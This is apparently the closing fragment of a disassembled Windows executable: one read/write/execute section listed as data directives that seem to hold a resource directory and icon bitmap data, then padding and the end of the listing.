; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00009800
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
D		segment	para public 'CODE' use32
		assume cs:D
		;org 419000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
		dd 3 dup(0), 20000h, 3,	80000020h, 0Eh,	80000040h, 3 dup(0)
		dd 20000h, 1, 80000058h, 2, 80000070h, 3 dup(0), 10000h
		dd 65h,	80000088h, 3 dup(0), 10000h, 407h, 0A0h, 3 dup(0)
		dd 10000h, 407h, 0B0h, 3 dup(0), 10000h, 407h, 0C0h, 190D0h
		dd 2E8h, 2 dup(0), 193B8h, 128h, 2 dup(0), 194E0h, 22h
		dd 2 dup(0), 28h, 20h, 40h, 40001h, 0, 280h, 4 dup(0)
		dd 0FFFFCCh, 585768h, 0, 808080h, 0FFFFFFh, 0C0C0C0h, 0FFh
		dd 0FFFF00h, 0BFh, 0FF0000h, 6 dup(0), 22122122h, 3 dup(22222222h)
		dd 55352122h, 2	dup(55555555h),	22222555h, 44442322h, 2	dup(44444444h)
		dd 22525244h, 44442322h, 44444444h, 45445455h, 22525255h
		dd 88442322h, 49448888h, 99444499h, 22525294h, 44442322h
		dd 44444444h, 49444495h, 22525254h, 88442322h, 44888888h
		dd 59555549h, 22525254h, 44442322h, 44444444h, 99999944h
		dd 22525254h, 88442322h, 88888888h, 49544944h, 22525254h
		dd 44442322h, 44444444h, 49954444h, 22525254h, 88442322h
		dd 88888888h, 59494488h, 22525254h, 44442322h, 44444444h
		dd 99444444h, 22525254h, 88442322h, 88888888h, 49448888h
		dd 22525244h, 44442322h, 2 dup(44444444h), 22525244h, 88442322h
		dd 2 dup(88888888h), 22525244h,	44442322h, 2 dup(44444444h)
		dd 22525244h, 88442322h, 2 dup(88888888h), 22525244h, 44442322h
		dd 2 dup(44444444h), 22525244h,	22442322h, 44222222h, 88888888h
		dd 22525244h, 39442322h, 44424492h, 44444444h, 22525244h
		dd 32442322h, 44222222h, 88888888h, 22525244h, 34442322h
		dd 44727742h, 44444444h, 22525244h, 32442322h, 44727722h
		dd 88888888h, 22525244h, 34442322h, 44727742h, 44444444h
		dd 22525244h, 34442322h, 44626642h, 44444444h, 22525244h
		dd 34442322h, 44626642h, 44444444h, 22525244h, 33442322h
		dd 44222232h, 44444444h, 22525244h, 44442322h, 2 dup(44444444h)
		dd 22525244h, 44422322h, 24444224h, 42244442h, 22523244h
		dd 44422322h, 24444224h, 42244442h, 22523244h, 33242222h
		dd 43333443h, 34433334h, 22224333h, 4 dup(22222222h), 0F0000E0h
		dd 1Dh dup(70000E0h), 0F0000F8h, 0FFFFFFFFh, 28h, 10h
		dd 20h,	40001h,	0, 0C0h, 5 dup(0), 800000h, 8000h, 808000h
		dd 80h,	800080h, 8080h,	0C0C0C0h, 808080h, 0FF0000h, 0FF00h
		dd 0FFFF00h, 0FFh, 0FF00FFh, 0FFFFh, 0FFFFFFh, 2 dup(0)
		dd 77777700h, 707777h, 9FFFFF00h, 709FFFh, 79FFFF00h, 709F99h
		dd 0F744F400h, 709F9Fh,	0FFFFFF00h, 709F79h, 4444F400h
		dd 709FF7h, 0FFFFFF00h,	70FFFFh, 4444F400h, 704F44h, 0FFFFFF00h
		dd 70FFFFh, 4444F400h, 704F44h,	0FFFFFF00h, 70FFFFh, 0FFFFFF00h
		dd 70FFFFh, 0F0F0F000h,	0F0F0F0h, 8F8F0F00h, 808F8Fh, 2	dup(0)
		dd 7C0h, 0Dh dup(3C0h),	7C0h, 0AFEAh, 10000h, 20200002h
		dd 10010h, 2E80004h, 10000h, 101010h, 40001h, 128h, 2
		dd 3Fh dup(0)
		dd 280h	dup(?)
D		ends


		end start
